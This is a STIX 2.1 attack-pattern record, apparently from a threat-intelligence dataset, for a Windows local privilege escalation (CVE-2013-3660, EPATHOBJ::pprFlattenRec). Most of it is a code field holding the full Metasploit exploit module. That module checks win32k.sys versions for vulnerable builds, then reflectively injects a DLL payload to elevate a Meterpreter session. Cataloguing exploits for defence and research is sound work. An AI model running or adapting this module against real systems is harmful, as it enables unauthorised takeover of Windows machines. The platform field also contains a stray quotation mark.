{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff62eded-6c7c-4404-9dd7-326098a0dff0",
    "created": "2024-08-14T16:49:26.183222Z",
    "modified": "2024-08-14T16:49:26.183225Z",
    "name": "Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation",
    "description": " This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage of uninitialized data which allows to corrupt memory. At the moment, the module has been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ppr_flatten_rec.rb",
            "external_id": "ppr_flatten_rec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3660"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2013/May/91"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation',\n          'Description' => %q{\n            This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage\n            of uninitialized data which allows to corrupt memory. At the moment, the module has\n            been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Vulnerability discovery and Original Exploit\n            'progmboy <programmeboy[at]gmail.com>', # Original Exploit\n            'Keebie4e',     # Metasploit integration\n            'egypt',        # Metasploit integration\n            'sinn3r',       # Metasploit integration\n            'Ben Campbell', # Metasploit integration\n            'juan vazquez', # Metasploit integration\n            'OJ Reeves'     # Metasploit integration\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread',\n            'WfsDelay' => 30\n          },\n          'Targets' => [\n            [ 'Automatic', {} ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2013-3660' ],\n            [ 'EDB', '25912' ],\n            [ 'OSVDB', '93539' ],\n            [ 'MSB', 'MS13-053' ],\n            [ 'URL', 'https://seclists.org/fulldisclosure/2013/May/91' ],\n          ],\n          'DisclosureDate' => '2013-05-15',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_config_getenv\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform == 'windows'\n      file_path = session.sys.config.getenv('windir') << '\\\\system32\\\\win32k.sys'\n      major, minor, build, revision, branch = file_version(file_path)\n      vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision}\")\n\n      # WinXP x86 - 5.1.2600.6404\n      # WinXP/2003 5.2.3790.5174\n      # WinVista/2k8 - 6.0.6002.18861 / 6.0.6002.23132\n      # Win72k8R2 -  6.1.7601.18176 / 6.1.7601.22348\n      # Win8/2012 - 6.2.9200.16627 / 6.2.9200.20732\n      case build\n      when 2600\n        return Exploit::CheckCode::Appears if revision < 6404\n      when 3790\n        return Exploit::CheckCode::Appears if revision < 5174\n      when 6000\n        return Exploit::CheckCode::Appears\n      when 6001\n        return Exploit::CheckCode::Appears\n      when 6002\n        if branch == 18\n          return Exploit::CheckCode::Appears if revision < 18861\n        elsif revision < 23132\n          return Exploit::CheckCode::Appears\n        end\n      when 7600\n        return Exploit::CheckCode::Appears\n      when 7601\n        if branch == 18\n          return Exploit::CheckCode::Appears if revision < 18176\n        elsif revision < 22348\n          return Exploit::CheckCode::Appears\n        end\n      when 9200\n        if branch == 16\n          return Exploit::CheckCode::Appears if revision < 16627\n        elsif revision < 20732\n          return Exploit::CheckCode::Appears\n        end\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Reflectively injecting the DLL into a new process and triggering the LPE...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2013-3660', 'ppr_flatten_rec.x86.dll'),\n      encoded_payload\n    )\n    print_status(\"Exploit thread executing (can take a while to run), waiting #{datastore['WfsDelay']} sec ...\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-15",
    "x_mitre_platforms": [
        "win'"
    ]
}